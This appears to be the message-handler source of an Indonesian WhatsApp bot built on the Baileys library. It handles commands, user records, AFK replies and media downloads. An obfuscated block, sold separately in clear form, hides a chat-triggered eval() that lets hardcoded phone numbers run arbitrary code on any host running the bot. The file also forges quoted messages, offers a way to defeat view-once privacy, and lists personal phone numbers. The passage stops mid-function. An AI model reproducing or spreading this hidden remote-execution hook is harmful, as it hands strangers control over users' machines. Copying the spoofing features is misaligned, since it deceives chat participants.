"use strict";
const { prepareMessageFromContent, generateWAMessageContent, prepareWAMessageMedia, generateForwardMessageContent, downloadMediaMessage, downloadContentFromMessage, toBuffer, generateWAMessageFromContent, proto, jidDecode } = require('@adiwajshing/baileys');
const Crypto = require("crypto")
const PhoneNumber = require('awesome-phonenumber');
const colors = require('colors/safe');
const fs = require('fs');
const { exec, spawn, execSync } = require('child_process')
const imageToBase64 = require('image-to-base64')
const { writeFile } = require ('fs/promises')
const moment = require("moment-timezone");
const ffmpeg = require('fluent-ffmpeg')
const path = require("path")
const Jimp = require("jimp")
const { util } = require("util")
const { didyoumean } = require ("didyoumean");
const xfar = require('xfarr-api');
const { phone } = require("phone")
const packagejson = JSON.parse(fs.readFileSync('./package.json')); 
const { owner, namabot, namaowner, donasi, fakereply } = require("./admin/config.json")
const toMs = require('ms')
const user = JSON.parse(fs.readFileSync('./lib/data.json')); 
const { getBuffer, fetchJson, fetchText, getRandom, getGroupAdmins, runtime, sendContact, sleep, makeid, parseMention, smsg } = require("./lib/myfunc");
const { only } = require("./lib/respoder")
const { help } = require("./admin/help")
const { setUser} = require("./lib/user")
const { fetch } = require('./lib/anu.js');
const { api, xa } = require('./admin/rest-api')
const { StickerMedia, ImageMedia, AudioMedia, VideoMedia, cekMedia, addMedia, listMedia, deleteMedia} = require('./media/media')
const { LogLoading, LogLoadingg } = require('./lib/spinner')
const { dataOnly } = require('./lib/data')
const { mAdd, isMenfess, isSend, isTo } = require('./lib/menfess')
moment.tz.setDefault('Asia/Jakarta').locale("id");
// Add by SatganzDevs
let menfess = JSON.parse(fs.readFileSync('./lib/menfess.json'));
module.exports = async (rimurubotz, nay, m, store) => {
try {
const type = Object.keys(nay.message)[0];
const body = (type === 'conversation') ? nay.message.conversation : (type == 'imageMessage') ? nay.message.imageMessage.caption : (type == 'videoMessage') ? nay.message.videoMessage.caption : (type == 'extendedTextMessage') ? nay.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? nay.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? nay.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? nay.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (nay.message.buttonsResponseMessage?.selectedButtonId || nay.message.listResponseMessage?.singleSelectReply.selectedRowId || nay.text) : ''
const budy = (type === 'conversation') ? nay.message.conversation : (type === 'extendedTextMessage') ? nay.message.extendedTextMessage.text : ''
const prefix = /^[./~!#%^&=\,;:()z]/.test(body) ? body.match(/^[./~!#%^&=\,;:()z]/gi) : '#';
const isCommand = body.startsWith(prefix);
const command = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const commands = isCommand ? body.slice(0).trim().split(/ +/).shift().toLowerCase() : null;
const time = moment(new Date()).format("HH:mm");
const text = nay.message.conversation;
const isGroup = nay.key.remoteJid.endsWith('@g.us');
const isPrivate = nay.key.remoteJid.endsWith('@s.whatsapp.net');
const from = nay.key.remoteJid;
const content = JSON.stringify(nay.message);
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const botNumber = rimurubotz.user.id.split(':')[0] + '@s.whatsapp.net';
const botName = rimurubotz.user.name;
const pushname = nay.pushName;
const sender = isGroup ? (nay.key.participant ? nay.key.participant : nay.participant) : nay.key.remoteJid;
const groupMetadata = isGroup ? await rimurubotz.groupMetadata(from) : '';
const uwong = isGroup ? await groupMetadata.participants : '';
const groupAdmins = isGroup ? await uwong.filter(v => v.admin !== null).map(a => a.id) : '';
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
const isGroupAdmins = groupAdmins.includes(sender) || false;
const groupName = isGroup ? groupMetadata.subject : "";
const groupMembers = isGroup ? groupMetadata.participants : ''
const isOwner = ["6281316701742@s.whatsapp.net"] == sender ? true : ["6282268590641@s.whatsapp.net","6283856085455@s.whatsapp.net","6285607859362@s.whatsapp.net","62882019583023@s.whatsapp.net"].includes(sender) ? true : false
const thumb = fs.readFileSync('./media/thumb.png')
const dthumb = fs.readFileSync('./media/docthb.jpg')
const q1 = q.split('&')[0];
const q2 = q.split('&')[1];
const q3 = q.split('&')[2];	
const q4 = q.split('&')[3];	
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' );
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage');
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage');
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage');
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage');
const isViewonce = type === content.includes('viewOnceMessage');
const footer = "© ＸｘＸ － Ｔｅａｍｓ"
let waktunya = moment.tz('Asia/Jakarta').format('HH')
let ucapin = 'Oyasuminasai ><'
if(waktunya >= 1) {
		ucapin = 'Ohayou ><'
	}
if(waktunya >= 4) {
		ucapin = 'Ohayou ><'
	}
if(waktunya > 10) {
		ucapin = `Kon'nichiwa ><`
	}
if(waktunya >= 15) {
		ucapin = `Kon'nichiwa ><`
	}
if(waktunya >= 18) {
		ucapin = 'Oyasuminasai ><'
	}
if(waktunya >= 24) {
ucapin = 'Jangan Begadang ><'
}
const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(nay.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nnay.enc","mimetype": "image/jpeg","caption": '©ＸｘＸ － Ｔｅａｍｓ',"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": thumb,"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
const cekUser = (users, id) => {     
var cek = null
Object.keys(user).forEach((i) => { 
if (user[i].id === id){ cek = i } })
if (cek !== null){ 
if (users == "id"){ return user[cek].id }
if (users == "emote"){ return user[cek].emote }
if (users == "timers"){ return user[cek].timers }
if (users == "hit"){ return user[cek].hit }
if (users == "star"){ return user[cek].star }
if (users == "afk"){ return user[cek].afk }
if (users == "alasan"){ return user[cek].alasan }
if (users == "ban"){ return user[cek].ban }
if (users == "premium"){ return user[cek].premium }
}
if (cek == null) return null
}

// SEBAGIAN SINI SAYA ENC, BUAT NO ENC SILAHKAN BUY DI 082347260729
var _0x135601=_0x2036;(function(_0x4c8fb7,_0x5e4fd1){var _0x1e1f1b=_0x2036,_0x4c3ca5=_0x4c8fb7();while(!![]){try{var _0x59cd37=-parseInt(_0x1e1f1b(0x21a))/(0x9ac+0x17a1+-0x214c)*(-parseInt(_0x1e1f1b(0x20c))/(-0x18*-0x155+-0x1*0x293+0x1*-0x1d63))+-parseInt(_0x1e1f1b(0x211))/(0xb15*0x3+0x2ca+-0x2406)+parseInt(_0x1e1f1b(0x24d))/(-0x2497+-0x46*0xd+0x2829)*(parseInt(_0x1e1f1b(0x1fc))/(-0x150b*-0x1+0x2f*-0x61+-0x337))+parseInt(_0x1e1f1b(0x203))/(-0x1652*0x1+0x369*-0x2+0x1d2a*0x1)+parseInt(_0x1e1f1b(0x297))/(-0x16bb+0x6b3+0x1*0x100f)*(-parseInt(_0x1e1f1b(0x2a2))/(0x4b6+-0x1d*0xda+-0xe*-0x16e))+parseInt(_0x1e1f1b(0x267))/(0x5*-0x105+0x26a+-0x6*-0x74)+parseInt(_0x1e1f1b(0x269))/(-0x53*-0x15+0x17d*0xd+0xd0f*-0x2)*(parseInt(_0x1e1f1b(0x271))/(0xab2+0xf20+-0x19c7));if(_0x59cd37===_0x5e4fd1)break;else _0x4c3ca5['push'](_0x4c3ca5['shift']());}catch(_0x414db3){_0x4c3ca5['push'](_0x4c3ca5['shift']());}}}(_0x251f,-0x10d3c3+-0x1c15ed+0x3b0fd8));const cr=_0x135601(0x231)+_0x135601(0x205)+_0x135601(0x273)+_0x135601(0x20e)+_0x135601(0x22b)+_0x135601(0x26c)+_0x135601(0x2ad)+_0x135601(0x252)+_0x135601(0x255)+_0x135601(0x227)+(_0x135601(0x28a)+namaowner+(_0x135601(0x1fa)+_0x135601(0x1fb))),nay1={'key':{'fromMe':![],'participant':_0x135601(0x293)+_0x135601(0x264),...from?{'remoteJid':_0x135601(0x266)+_0x135601(0x21b)}:{}},'message':{'contactMessage':{'displayName':fakereply,'vcard':_0x135601(0x23f)+'D\x0a'+(_0x135601(0x242)+'0\x0a')+(_0x135601(0x222)+_0x135601(0x247)+sender[_0x135601(0x22d)]('@')[-0x6*0x2cf+0x39*-0x98+0x7*0x73e]+':+'+sender[_0x135601(0x22d)]('@')[0x3*-0x5bb+0x590+0xba1*0x1]+'\x0a')+(_0x135601(0x232)+_0x135601(0x28f)+_0x135601(0x268))+_0x135601(0x24b)}}};async function reply(_0x557e3f){var _0x305ddc=_0x135601;rimurubotz[_0x305ddc(0x2a1)+'e'](from,{'text':_0x557e3f,'mentions':[sender]},{'quoted':nay1});}async function SendRegisBut(from){var _0x5c98d7=_0x135601;rimurubotz[_0x5c98d7(0x2a1)+'e'](from,{'text':_0x5c98d7(0x215)+_0x5c98d7(0x27a)+_0x5c98d7(0x25f)+_0x5c98d7(0x291)+_0x5c98d7(0x23a)+sender[_0x5c98d7(0x22d)]('@')[-0x311+0x232e+-0x201d]+(_0x5c98d7(0x243)+_0x5c98d7(0x235)+_0x5c98d7(0x236)+_0x5c98d7(0x2a6)+_0x5c98d7(0x245)+_0x5c98d7(0x1f5)+_0x5c98d7(0x1f8)+_0x5c98d7(0x25d)+_0x5c98d7(0x201)+_0x5c98d7(0x296)),'mentions':[sender]},{'quoted':nay1});}const Tag=()=>{var _0x2cb046=_0x135601,_0x31964a={'cDaNp':function(_0x48989e,_0x1fdfa9){return _0x48989e!==_0x1fdfa9;}},_0x1ab9ab=[];return _0x31964a[_0x2cb046(0x287)](m[_0x2cb046(0x279)][0x2aa+0xb*-0x59+0x129][_0x2cb046(0x23b)],'')&&_0x1ab9ab[_0x2cb046(0x263)](m[_0x2cb046(0x279)][-0x5*0x693+0x78*-0x42+-0x63*-0xa5][_0x2cb046(0x23b)][-0x1e9*-0x8+0xb9*0xd+-0x18ad]),_0x1ab9ab;};if(isCommand){if(cekUser('id',sender)!==null){LogLoadingg(_0x135601(0x246)+pushname+(_0x135601(0x22c)+'\x20')+(prefix+command)+(_0x135601(0x261)+':\x20')+time+'\x20]'),setUser(_0x135601(0x244),sender,-0x995+0x25e0+-0x1c4a);if(cekUser(_0x135601(0x249),sender)==!![])return reply(_0x135601(0x1f1)+_0x135601(0x298)+_0x135601(0x26d)+_0x135601(0x251)+_0x135601(0x282)+_0x135601(0x277)+_0x135601(0x29b)+_0x135601(0x216)+_0x135601(0x20f)+_0x135601(0x286));}}if(m){if(m[_0x135601(0x279)][-0xf76*-0x1+-0x97*-0x19+-0xb*0x2bf][_0x135601(0x23b)]!==''){if(m[_0x135601(0x279)][-0x51*0x6d+-0x1fd+0x247a][_0x135601(0x23b)][-0xdc7+-0x5f*0xa+0x117d]==cekUser('id',m[_0x135601(0x279)][0xa1f+-0x17*0xc1+0x738][_0x135601(0x23b)][0x705+0x2*0xdf5+-0x22ef])){var afk1=cekUser('id',m[_0x135601(0x279)][0x1*0x3a6+0x92a+-0xcd0][_0x135601(0x23b)][-0x120+0x1a69*0x1+-0x1*0x1949]);cekUser(_0x135601(0x292),afk1)==!![]&&rimurubotz[_0x135601(0x2a1)+'e'](from,{'sticker':{'url':_0x135601(0x229)+_0x135601(0x280)+_0x135601(0x21f)+_0x135601(0x27b)+_0x135601(0x27e)+_0x135601(0x2a0)+_0x135601(0x29a)}},{'quoted':{'key':{'fromMe':![],'participant':_0x135601(0x293)+_0x135601(0x264),...from?{'remoteJid':_0x135601(0x266)+_0x135601(0x21b)}:{}},'message':{'conversation':_0x135601(0x218)+_0x135601(0x2b0)+'i\x20'+cekUser(_0x135601(0x248),afk1)}}});}}if(cekUser(_0x135601(0x292),sender)==!![])return setUser(_0x135601(0x28c),sender,![]),setUser(_0x135601(0x285),sender,![]),reply(_0x135601(0x295)+_0x135601(0x26b)+_0x135601(0x230)+_0x135601(0x233)+sender[_0x135601(0x22d)]('@')[-0x9*0x2a7+-0x7*-0x577+-0xe62]);}if(budy[_0x135601(0x223)]('$')){if(!isOwner)return;let evaled=await eval(q);if(typeof evaled!==_0x135601(0x21d))evaled=require(_0x135601(0x22f))[_0x135601(0x20b)](evaled);await reply(evaled),await LogLoadingg(evaled+_0x135601(0x262));}function _0x2036(_0x3d7d4d,_0x39d3bb){var _0x17dbc6=_0x251f();return _0x2036=function(_0x1e769a,_0x12247b){_0x1e769a=_0x1e769a-(0x258e+0x1110+-0x34af);var _0x241de9=_0x17dbc6[_0x1e769a];return _0x241de9;},_0x2036(_0x3d7d4d,_0x39d3bb);}var downloadDone=![];function _0x251f(){var _0x21515f=['😡,\x20dia\x20lag','OICE;waid=','adc08ede48','profilePic','vcard','Kamu\x20sudah','YqNQQ','xtMessage','imageMessa','endaftar\x20t','stickerMes','HUJBC','erlebih\x20da','qjNyD','*\x0a╰━─━─━─━','─━─━─━─•','40Qutuoc','message','audio','.png','FN:','kan\x20comman','sticker','4171884eDayos','jPedR','HX-TO*\x20]⊱\x0a','-1280-605a','NKraI','BxbVV','nGfRH','tureUrl','inspect','705718NFiKHg','url.jpg','AJ\x20SINGH*\x0a','an\x20oleh\x20ow','replace','5404521fnUdBt','tVEhv','PSulZ','PPUrl','[\x20*NEW\x20INF','nda\x20di\x20unb','./media/','Jangan\x20tag','base64','1pivHdI','adcast','*\x20:\x20','string','tacts;\x0a','ercontent.','pIKMv','imageUrl','item1.TEL;','includes','TEL;type=C','tems/album','videoMessa','Z*\x0a','lJzfE','https://ra','readFileSy','┃•\x20\x20*RIMUR','\x20]=[\x20CMD\x20:','split','diHig','util','mat\x20datang','\x0a╭━─━•[\x20*T','item1.X-AB','\x20kembali\x20@','RuZoO','um\x20terdaft','ar\x20di\x20Data','YHuOn','HNmkH','.mp3','lo\x20@','mentioned','from','eType:\x20Con','WkbfD','BEGIN:VCAR','Zfdwv','http://ass','VERSION:3.',',\x20Kamu\x20bel','+hit','Silahkan\x20m','[USER\x20:\x20','waid=','alasan','ban','ure-973460','END:VCARD','Acvmb','50044RWvzuE','oQMZw','/2021/03/2','iana.com/i','\x20tidak\x20bis','LERS*\x0a┃•\x20\x20','74e1153a12','MysMh','*LORD\x20R1YN','zIcpT','TtRJZ','xvsxn','ELL;type=V','ofile-pict','zrygf','contextInf','hulu,\x20Guna','ync','er*\x20:\x20Null','eodgY','\x20]=[\x20TIME\x20','\x0a\x0a\x0a\x0a','push','pp.net','tools','status@bro','6317019ETRsHJ','el\x0a','10vKIWvY','.mp4','IF*\x20]\x0aSela','UBOTZ*\x0a┃•\x20',',\x20Dan\x20kamu','srgmL','fYxPm','KYtTZ','26526775xJfxjV','video','┃•\x20\x20*ADHIR','.jpg','LztoZ','forEach','kan\x20bot\x20in','url_file','messages','O*\x20]\x0a•\x20*Us','com/naylac','uploadFile','5|0|3|1|4|','han/STICKE','quotedMess','w.githubus','image','a\x20mengguna','Ovzqv','concat','±alasan','ner','cDaNp','textpro','FsIpx','┃•\x20\x20*','sage','±afk','ets.kompas','2|1|0|3|4','Label:Pons','result','\x0a~>\x20[🤖]\x20Ha','afk','0@s.whatsa','keys','[\x20*AFK-NOT','d\x20#daftar','198709JBkGfx','\x20di\x20banned','stringify','.webp','i\x20sampai\x20a','audio/mp4','./media/pp','writeFileS','extendedTe','R/main/tag','sendMessag','432xviWFy','wtiUd','Jeff','audioMessa','base\x20bot,\x20','ORG:Messag','VijxI','uSnTW','lmOoD','age','XUoNz','\x20*LOLI\x20KIL','4/blank-pr','\x0a•\x20*'];_0x251f=function(){return _0x21515f;};return _0x251f();}async function download(_0x3ce3a6,_0x1f9950,_0x2a9313){var _0x2e5b30=_0x135601,_0x105831={'HNmkH':function(_0x10d3c4,_0xafea0c){return _0x10d3c4==_0xafea0c;},'YqNQQ':_0x2e5b30(0x281),'xvsxn':function(_0x2594be,_0x3aa2f6,_0x4a9f9e){return _0x2594be(_0x3aa2f6,_0x4a9f9e);},'VijxI':_0x2e5b30(0x221),'qjNyD':function(_0x3d26ef,_0x2700b8,_0x5bd354){return _0x3d26ef(_0x2700b8,_0x5bd354);},'jPedR':function(_0x443fa9,_0x5e3a65){return _0x443fa9==_0x5e3a65;},'tVEhv':_0x2e5b30(0x214),'TtRJZ':_0x2e5b30(0x28e),'srgmL':_0x2e5b30(0x29d)+_0x2e5b30(0x20d),'LztoZ':_0x2e5b30(0x219),'MysMh':function(_0x280814,_0x57f3d1){return _0x280814(_0x57f3d1);},'FsIpx':_0x2e5b30(0x241)+_0x2e5b30(0x28d)+_0x2e5b30(0x250)+_0x2e5b30(0x225)+_0x2e5b30(0x24f)+_0x2e5b30(0x2ae)+_0x2e5b30(0x25a)+_0x2e5b30(0x24a)+_0x2e5b30(0x206)+_0x2e5b30(0x2b2)+_0x2e5b30(0x253)+_0x2e5b30(0x1ff),'XUoNz':_0x2e5b30(0x202),'lJzfE':function(_0x4cf978,_0x47e585){return _0x4cf978==_0x47e585;},'HUJBC':_0x2e5b30(0x1fe),'fYxPm':_0x2e5b30(0x272),'uSnTW':function(_0x503815,_0x265f74,_0x49f9de){return _0x503815(_0x265f74,_0x49f9de);}};if(_0x105831[_0x2e5b30(0x238)](_0x3ce3a6,_0x105831[_0x2e5b30(0x1f2)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x258)](downloadContentFromMessage,nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x1f4)+'ge']||nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x1f4)+'ge'],_0x105831[_0x2e5b30(0x1f2)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x395e69 of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x395e69]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x274),_0x3bee7f),downloadDone=!![];}if(_0x105831[_0x2e5b30(0x238)](_0x3ce3a6,_0x105831[_0x2e5b30(0x2a8)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x1f9)](downloadContentFromMessage,nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x1f4)+'ge']||nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x1f4)+'ge'],_0x105831[_0x2e5b30(0x1f2)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x34dd7a of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x34dd7a]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x274),_0x3bee7f);var _0x22fa87=await api[_0x2e5b30(0x265)][_0x2e5b30(0x27c)](fs[_0x2e5b30(0x22a)+'nc'](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x274)));return _0x22fa87[_0x2e5b30(0x290)][_0x2e5b30(0x278)];}if(_0x105831[_0x2e5b30(0x204)](_0x3ce3a6,_0x105831[_0x2e5b30(0x212)])){var _0x27b5bb=_0x105831[_0x2e5b30(0x257)][_0x2e5b30(0x22d)]('|'),_0x20e648=-0x5*0x46b+-0x120d+-0x1c*-0x16f;while(!![]){switch(_0x27b5bb[_0x20e648++]){case'0':fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x105831[_0x2e5b30(0x26e)],_0x2074bb,_0x105831[_0x2e5b30(0x275)]);continue;case'1':var _0x2074bb=await _0x105831[_0x2e5b30(0x254)](imageToBase64,JSON[_0x2e5b30(0x299)](_0x20f586)[_0x2e5b30(0x210)](/\"/gi,''));continue;case'2':try{var _0x20f586=await rimurubotz[_0x2e5b30(0x1ef)+_0x2e5b30(0x20a)](_0x1f9950,_0x105831[_0x2e5b30(0x1f2)]);}catch(_0x2b8335){var _0x20f586=_0x105831[_0x2e5b30(0x289)];}continue;case'3':var _0x365264=await api[_0x2e5b30(0x265)][_0x2e5b30(0x27c)](fs[_0x2e5b30(0x22a)+'nc'](_0x2e5b30(0x29d)+_0x2e5b30(0x20d)));continue;case'4':return _0x365264[_0x2e5b30(0x290)][_0x2e5b30(0x278)];}break;}}if(_0x105831[_0x2e5b30(0x238)](_0x3ce3a6,_0x105831[_0x2e5b30(0x2ac)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x258)](downloadContentFromMessage,nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x1f6)+_0x2e5b30(0x28b)]||nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x1f6)+_0x2e5b30(0x28b)],_0x105831[_0x2e5b30(0x2ac)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x245f72 of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x245f72]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x29a),_0x3bee7f);}if(_0x105831[_0x2e5b30(0x228)](_0x3ce3a6,_0x105831[_0x2e5b30(0x1f7)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x258)](downloadContentFromMessage,nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x2a5)+'ge']||nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x2a5)+'ge'],_0x105831[_0x2e5b30(0x1f7)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x5ac8a3 of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x5ac8a3]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x239),_0x3bee7f);}if(_0x105831[_0x2e5b30(0x204)](_0x3ce3a6,_0x105831[_0x2e5b30(0x26f)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x2a9)](downloadContentFromMessage,nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x226)+'ge']||nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x226)+'ge'],_0x105831[_0x2e5b30(0x26f)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x25fa8c of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x25fa8c]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x26a),_0x3bee7f);}}async function sendMedia(_0x3b2470,_0x1893ec,_0x518c78){var _0x50bab3=_0x135601,_0x2003a5={'zIcpT':_0x50bab3(0x27d)+'2','Acvmb':function(_0x237dd3,_0x28354b){return _0x237dd3==_0x28354b;},'zrygf':_0x50bab3(0x281),'oQMZw':function(_0x26ebde,_0x45d5c0){return _0x26ebde==_0x45d5c0;},'wtiUd':_0x50bab3(0x202),'NKraI':function(_0x4a92a5,_0x3ec989){return _0x4a92a5==_0x3ec989;},'pIKMv':_0x50bab3(0x29c),'diHig':function(_0x4ee0ad,_0x30f599){return _0x4ee0ad==_0x30f599;},'Zfdwv':_0x50bab3(0x272),'PSulZ':_0x50bab3(0x1fe),'nGfRH':_0x50bab3(0x1f0),'KYtTZ':function(_0x242a65,_0x4ecc17){return _0x242a65+_0x4ecc17;},'Ovzqv':function(_0xaeb92e,_0x8cfca7){return _0xaeb92e+_0x8cfca7;},'BxbVV':function(_0x5d83f0,_0x4fef11){return _0x5d83f0+_0x4fef11;},'YHuOn':_0x50bab3(0x23f)+'D\x0a','RuZoO':_0x50bab3(0x242)+'0\x0a','WkbfD':_0x50bab3(0x2a7)+_0x50bab3(0x23d)+_0x50bab3(0x21e),'eodgY':_0x50bab3(0x24b),'lmOoD':_0x50bab3(0x2a4)},_0x464d92=_0x2003a5[_0x50bab3(0x256)][_0x50bab3(0x22d)]('|'),_0x3871e9=0x168e+-0x228b+0xbfd;while(!![]){switch(_0x464d92[_0x3871e9++]){case'0':_0x2003a5[_0x50bab3(0x24c)](_0x3b2470,_0x2003a5[_0x50bab3(0x25b)])&&rimurubotz[_0x50bab3(0x2a1)+'e'](from,{'image':{'url':_0x1893ec},'caption':_0x518c78,'mentions':[sender]},{'quoted':nay1});continue;case'1':_0x2003a5[_0x50bab3(0x24e)](_0x3b2470,_0x2003a5[_0x50bab3(0x2a3)])&&rimurubotz[_0x50bab3(0x2a1)+'e'](from,{'sticker':{'url':_0x1893ec},'mentions':[sender]},{'quoted':nay1});continue;case'2':_0x2003a5[_0x50bab3(0x207)](_0x3b2470,'vn')&&rimurubotz[_0x50bab3(0x2a1)+'e'](from,{'audio':{'url':_0x1893ec},'mimetype':_0x2003a5[_0x50bab3(0x220)],'ptt':!![],'mentions':[sender]},{'quoted':nay1});continue;case'3':_0x2003a5[_0x50bab3(0x22e)](_0x3b2470,_0x2003a5[_0x50bab3(0x240)])&&rimurubotz[_0x50bab3(0x2a1)+'e'](from,{'video':{'url':_0x1893ec},'caption':_0x518c78,'mentions':[sender]},{'quoted':nay1});continue;case'4':_0x2003a5[_0x50bab3(0x24c)](_0x3b2470,_0x2003a5[_0x50bab3(0x213)])&&rimurubotz[_0x50bab3(0x2a1)+'e'](from,{'audio':{'url':_0x1893ec},'mimetype':_0x2003a5[_0x50bab3(0x220)],'mentions':[sender]},{'quoted':nay1});continue;case'5':if(_0x2003a5[_0x50bab3(0x24c)](_0x3b2470,_0x2003a5[_0x50bab3(0x209)])){var _0x286074=_0x2003a5[_0x50bab3(0x270)](_0x2003a5[_0x50bab3(0x283)](_0x2003a5[_0x50bab3(0x283)](_0x2003a5[_0x50bab3(0x208)](_0x2003a5[_0x50bab3(0x283)](_0x2003a5[_0x50bab3(0x237)],_0x2003a5[_0x50bab3(0x234)]),_0x50bab3(0x200)+_0x1893ec+'\x0a'),_0x2003a5[_0x50bab3(0x23e)]),_0x50bab3(0x224)+_0x50bab3(0x259)+_0x50bab3(0x2b1)+_0x518c78+':+'+_0x518c78+'\x0a'),_0x2003a5[_0x50bab3(0x260)]);rimurubotz[_0x50bab3(0x2a1)+'e'](from,{'contacts':{'displayName':_0x2003a5[_0x50bab3(0x2aa)],'contacts':[{'vcard':_0x286074}]}});}continue;}break;}}async function textPro1(_0xe3ea35,_0x18e733){var _0x3f5161=_0x135601,_0x4f93ef=await api[_0x3f5161(0x265)][_0x3f5161(0x288)](_0xe3ea35,[_0x18e733]);return _0x4f93ef;}async function textPro2(_0x3af9b6,_0x5f3576,_0x2e7999){var _0x3a2bf4=_0x135601,_0x3d1497=await api[_0x3a2bf4(0x265)][_0x3a2bf4(0x288)](_0x3af9b6,[_0x5f3576,_0x2e7999]);return _0x3d1497;}async function getResult(_0x4a268d,_0x41f6d6,_0x44779c){var _0x4d33a9=_0x135601,_0x4c8235=_0x4a268d;return Object[_0x4d33a9(0x294)](_0x41f6d6)[_0x4d33a9(0x276)](_0x3fbf0a=>{var _0xd5da83=_0x4d33a9;_0x4c8235+=_0xd5da83(0x2af)+_0x41f6d6[_0x3fbf0a]+_0xd5da83(0x21c)+_0x44779c[_0x3fbf0a];}),_0x4c8235;}const imgToUrl=async function(_0x45c687){var _0x3a7346=_0x135601,_0x379375=await api[_0x3a7346(0x265)][_0x3a7346(0x27c)](fs[_0x3a7346(0x22a)+'nc'](_0x45c687));return _0x379375[_0x3a7346(0x290)][_0x3a7346(0x278)];};

// Slebewww
const rpy = (jid, teks) => {
	rimurubotz.sendMessage(jid, {document: fs.readFileSync('./menu.doc'),
jpegThumbnail: thumb,
fileName: footer,
mimetype: 'application/pdf',
fileLength: '999999',
pageCount: '999', caption: teks, contextInfo: { externalAdReply :{ mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`, mediaType: 1, description: 'Join Group Official', title: 'ＸｘＸ － Ｔｅａｍｓ Official', body: footer, thumbnail: thumb, renderLargerThumbnail: 1, sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}}, { quoted : fpayment })
     }
   const copyNForward = async (jid, message, forceForward = false, options = {}) => {
        let vtype
		if (options.readViewOnce) {
			message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
